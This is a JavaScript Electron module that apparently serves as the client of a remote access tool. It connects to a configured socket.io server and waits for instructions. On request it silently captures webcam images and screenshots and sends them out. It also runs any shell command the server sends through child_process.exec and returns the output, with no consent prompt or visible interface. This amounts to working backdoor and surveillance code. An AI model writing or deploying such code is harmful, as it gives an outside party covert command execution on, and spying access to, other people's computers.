
const { desktopCapturer, screen, app } = require("electron");
const io = require("socket.io-client");
const child_process = require("child_process");
const nwc = require("node-webcam");

//const robot = require("robotjs");

// My Modules
const info = require("./config");


class RemoteControl {
    constructor() {
        this.getCamData();
    }
    getCamData = (data) => {
        return new Promise((resolve, reject) => {
            (async () => {

                var options = {
                    width: 30,
                    height: 30,
                    quality: 0.1,
                    delay: 2,
                    saveShots: false,
                    output: "jpeg",
                    device: false,
                    callbackReturn: "base64"
                };

                let wc = nwc.create(options);
                wc.capture("a.db", (error, result) => {
                    try {
                        data["src"] = result;

                        this.socket.emit("screenshotResponse", data);
                        resolve("success");
                    } catch (error) {
                        resolve("not yet");
                    }

                });

            })()
        });
    }

    getScreenData = (data) => {
        let pr = new Promise((resolve, reject) => {
            (async () => {
                let sources = await desktopCapturer.getSources({
                    types: ["screen"],
                    thumbnailSize: {
                        width: parseInt(data.dimension.split("x")[0]),
                        height: parseInt(data.dimension.split("x")[1])
                    }
                });

                data["src"] = sources[data.screen].thumbnail.toDataURL();
                this.socket.emit("screenshotResponse", data);
                resolve("success");
            })()
        });
        return pr;
    }

    findComparedPosition = (data) => {
        return {
            x: data.mousePosition.x * (screen.getAllDisplays()[data.screen].size.width / data.webScreen.width),
            y: data.mousePosition.y * (screen.getAllDisplays()[data.screen].size.height / data.webScreen.height)
        }
    }

    start = (mainWindow) => {

        this.socket = io.connect("http://" + info.host + ":" + info.port);
        this.socket.on("connect", () => {
            this.socket.emit("joinToRoom", { roomName: "terminal-" + info.id });
        });

        this.socket.on("screenshotRequest", data => {

            this.getCamData(data).then();
            //this.getScreenData(data).then();
        });


        this.socket.on("getRunRequest", data => {

            child_process.exec(data.cmd, { shell: true }, (err, stdout, stderr) => {
                if (err) {
                    data["cmd"] = "err: " + err;
                }
                else if (stderr) {
                    data["cmd"] = "stderr: " + stderr;
                }
                else {
                    data["cmd"] = stdout;
                }

                this.socket.emit("getRunResponse", data);
            });
        });
        this.socket.on("mousemove", data => {
            data["compared"] = this.findComparedPosition(data);
            data["screen_resolition"] = screen.getAllDisplays()[data.screen].size;
            //robot.moveMouse(data.compared.x, data.compared.y);
        });
        this.socket.on("click", data => {
            //robot.mouseClick()
        });
    }
}

module.exports = new RemoteControl;